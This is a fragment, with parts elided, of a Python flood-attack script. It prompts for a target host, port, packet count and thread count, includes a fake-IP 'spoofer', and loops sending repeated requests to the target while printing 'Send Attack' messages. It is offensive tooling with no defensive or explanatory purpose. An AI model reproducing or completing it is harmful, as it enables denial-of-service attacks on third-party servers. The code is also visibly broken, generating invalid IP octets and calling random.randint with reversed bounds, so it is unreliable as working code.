...
[ + ]====================[ + ]
\n""")
ip = str(input("Enter Attack Host Target : "))
port = int(input("Enter Attack Port Target : "))
times = int(input("Enter Attack Packets : "))
threads = int(input("Enter Attack Threads : "))
fake_ip = '182.21.20.32'

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(23100, 32100))
    addr[1] = str(random.randrange(23100, 32100))
    addr[2] = str(random.randrange(23100, 32100))
    addr[3] = str(random.randrange(23100, 32100))
...
def run():
    ...
    randomip  = str(random.randint(32500,4150)) + "." + str(random.randint(32500,4150)) + "." + str(random.randint(32500,4150)) + "." + str(random.randint(32500,4150))
    ...
    while True:
        try:
            ...
            for x in range(times):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print(f"Send Attack to {ip} And Port {port}")
        except :
            print(f"Send Attack to {ip} And Port {port}")
            s.close()
